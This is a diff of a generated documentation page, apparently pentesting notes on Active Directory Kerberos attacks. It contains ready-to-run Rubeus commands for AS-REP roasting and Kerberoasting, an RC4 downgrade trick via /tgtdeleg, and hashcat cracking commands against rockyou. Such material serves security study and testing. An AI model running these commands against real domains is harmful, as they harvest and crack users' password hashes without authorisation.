@@ -27821,6 +27821,21 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Importing Converted Ticket into Windows Session with Rubeus: </p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 </span></code></pre></div></td></tr></table></div>
+<p>Retrieving AS-REP in Proper Format using Rubeus</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$user</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">format</span><span class="p">:</span><span class="n">hashcat</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="c"># Example:</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="c"># .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Or for all roastable users</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c"># Retrieving AS-REP in Proper Format using Rubeus</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">format</span><span class="p">:</span><span class="n">hashcat</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Cracking the Hash Offline with Hashcat:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>ilfreight_asrep<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="evasion-techniques">Evasion techniques</h2>
 <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:</p>
 <ul>
@@ -27829,153 +27844,153 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack.</p>
 <p>We can check out if the user has the <code>msDS-SupportedEncryptionTypes</code> attribute is set to <code>0</code> (meaning that is using RC4 (type 23) encryption.  The chart <a href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797">here</a> tells us that a decimal value of <code>0</code> means that a specific encryption type is not defined and set to the default of <code>RC4_HMAC_MD5</code>.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
-<span class="normal"><a href="#__codelineno-4-2">2</a></span>
-<span class="normal"><a href="#__codelineno-4-3">3</a></span>
-<span class="normal"><a href="#__codelineno-4-4">4</a></span>
-<span class="normal"><a href="#__codelineno-4-5">5</a></span>
-<span class="normal"><a href="#__codelineno-4-6">6</a></span>
-<span class="normal"><a href="#__codelineno-4-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c"># Check the encryption of the TGS ticket for user testspn</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="nb">Get-DomainUser</span> <span class="n">testspn</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">msds-supportedencryptiontypes</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="c">#serviceprincipalname       msds-supportedencryptiontypes samaccountname</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="c"># ----------                 ----------------------------- --------------</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="c"># testspn/kerberoast.inlanefreight.local               0   testspn</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span>
+<span class="normal"><a href="#__codelineno-7-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c"># Check the encryption of the TGS ticket for user testspn</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="nb">Get-DomainUser</span> <span class="n">testspn</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">msds-supportedencryptiontypes</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="c">#serviceprincipalname       msds-supportedencryptiontypes samaccountname</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="c"># ----------                 ----------------------------- --------------</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="c"># testspn/kerberoast.inlanefreight.local               0   testspn</span>
 </span></code></pre></div></td></tr></table></div>
 <p>With RC4 (type 23) encryption, this would be the hashcat module:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="go">hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt </span>
 </span></code></pre></div></td></tr></table></div>
 <p>The results for the AES-256 (type 18) encryption would be <code>24</code>:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
-<span class="normal"><a href="#__codelineno-6-2">2</a></span>
-<span class="normal"><a href="#__codelineno-6-3">3</a></span>
-<span class="normal"><a href="#__codelineno-6-4">4</a></span>
-<span class="normal"><a href="#__codelineno-6-5">5</a></span>
-<span class="normal"><a href="#__codelineno-6-6">6</a></span>
-<span class="normal"><a href="#__codelineno-6-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c"># Check the encryption of the TGS ticket for user testspn</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="nb">Get-DomainUser</span> <span class="n">testspn</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">msds-supportedencryptiontypes</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="c">#serviceprincipalname       msds-supportedencryptiontypes samaccountname</span>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c"># ----------                 ----------------------------- --------------</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="c"># testspn/kerberoast.inlanefreight.local               24   testspn</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span>
+<span class="normal"><a href="#__codelineno-9-6">6</a></span>
+<span class="normal"><a href="#__codelineno-9-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="c"># Check the encryption of the TGS ticket for user testspn</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nb">Get-DomainUser</span> <span class="n">testspn</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">msds-supportedencryptiontypes</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="c">#serviceprincipalname       msds-supportedencryptiontypes samaccountname</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="c"># ----------                 ----------------------------- --------------</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="c"># testspn/kerberoast.inlanefreight.local               24   testspn</span>
 </span></code></pre></div></td></tr></table></div>
 <p>With AES (type 18) encryption, this would be the hashcat module:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="go">hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="go">hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt </span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>We can use Rubeus with the <code>/tgtdeleg</code> flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256.</strong> This may be a failsafe built-in to Active Directory for backward compatibility.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
-<span class="normal"><a href="#__codelineno-8-2">2</a></span>
-<span class="normal"><a href="#__codelineno-8-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c"># Perform Kerberoasting on a user testspn</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">testspn</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">tgtdeleg</span>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="c"># /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c"># Perform Kerberoasting on a user testspn</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">testspn</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">tgtdeleg</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="c"># /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.</span>
 </span></code></pre></div></td></tr></table></div>
 <blockquote>
 <p>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</p>
 <p>In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. </p>
 </blockquote>
 <h2 id="more-commands">More commands</h2>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-9-10">10</a></span>
-<span class="normal"><a href="#__codelineno-9-11">11</a></span>
-<span class="normal"><a href="#__codelineno-9-12">12</a></span>
-<span class="normal"><a href="#__codelineno-9-13">13</a></span>
-<span class="normal"><a href="#__codelineno-9-14">14</a></span>
-<span class="normal"><a href="#__codelineno-9-15">15</a></span>
-<span class="normal"><a href="#__codelineno-9-16">16</a></span>
-<span class="normal"><a href="#__codelineno-9-17">17</a></span>
-<span class="normal"><a href="#__codelineno-9-18">18</a></span>
-<span class="normal"><a href="#__codelineno-9-19">19</a></span>
-<span class="normal"><a href="#__codelineno-9-20">20</a></span>
-<span class="normal"><a href="#__codelineno-9-21">21</a></span>
-<span class="normal"><a href="#__codelineno-9-22">22</a></span>
-<span class="normal"><a href="#__codelineno-9-23">23</a></span>
-<span class="normal"><a href="#__codelineno-9-24">24</a></span>
-<span class="normal"><a href="#__codelineno-9-25">25</a></span>
-<span class="normal"><a href="#__codelineno-9-26">26</a></span>
-<span class="normal"><a href="#__codelineno-9-27">27</a></span>
-<span class="normal"><a href="#__codelineno-9-28">28</a></span>
-<span class="normal"><a href="#__codelineno-9-29">29</a></span>
-<span class="normal"><a href="#__codelineno-9-30">30</a></span>
-<span class="normal"><a href="#__codelineno-9-31">31</a></span>
-<span class="normal"><a href="#__codelineno-9-32">32</a></span>
-<span class="normal"><a href="#__codelineno-9-33">33</a></span>
-<span class="normal"><a href="#__codelineno-9-34">34</a></span>
-<span class="normal"><a href="#__codelineno-9-35">35</a></span>
-<span class="normal"><a href="#__codelineno-9-36">36</a></span>
-<span class="normal"><a href="#__codelineno-9-37">37</a></span>
-<span class="normal"><a href="#__codelineno-9-38">38</a></span>
-<span class="normal"><a href="#__codelineno-9-39">39</a></span>
-<span class="normal"><a href="#__codelineno-9-40">40</a></span>
-<span class="normal"><a href="#__codelineno-9-41">41</a></span>
-<span class="normal"><a href="#__codelineno-9-42">42</a></span>
-<span class="normal"><a href="#__codelineno-9-43">43</a></span>
-<span class="normal"><a href="#__codelineno-9-44">44</a></span>
-<span class="normal"><a href="#__codelineno-9-45">45</a></span>
-<span class="normal"><a href="#__codelineno-9-46">46</a></span>
-<span class="normal"><a href="#__codelineno-9-47">47</a></span>
-<span class="normal"><a href="#__codelineno-9-48">48</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="c"># Gather some stats:</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="c"># Perform Kerberoasting:</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a>
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a><span class="c"># Perform Kerberoasting, outputting hashes to a file:</span>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">txt</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span>
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12"></a>
-</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13"></a>
-</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14"></a><span class="c"># Perform Kerberoasting, outputting hashes in the file output format, but to the console:</span>
-</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">simple</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16"></a>
-</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17"></a><span class="c"># Perform Kerberoasting with alternate credentials:</span>
-</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">creduser</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">FQDN</span><span class="p">\</span><span class="n">USER</span> <span class="p">/</span><span class="n">credpassword</span><span class="p">:</span><span class="n">PASSWORD</span> <span class="p">[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19"></a>
-</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20"></a><span class="c"># Perform Kerberoasting with an existing TGT:</span>
-</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span> <span class="p">|</span> <span class="p">/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22"></a>
-</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23"></a><span class="c"># Perform Kerberoasting with an existing TGT using an enterprise principal:</span>
-</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">spn</span><span class="p">:</span><span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="p">/</span><span class="n">spns</span><span class="p">:</span><span class="n">user1</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="p">,</span><span class="n">user2</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">enterprise</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25"></a>
-</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26"></a><span class="c"># Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:</span>
-</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">autoenterprise</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28"></a>
-</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29"></a><span class="c"># Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:</span>
-</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">usetgtdeleg</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31"></a>
-</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32"></a><span class="c"># Perform &quot;opsec&quot; Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:</span>
-</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">rc4opsec</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34"></a>
-</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35"></a><span class="c"># List statistics about found Kerberoastable accounts without actually sending ticket requests:</span>
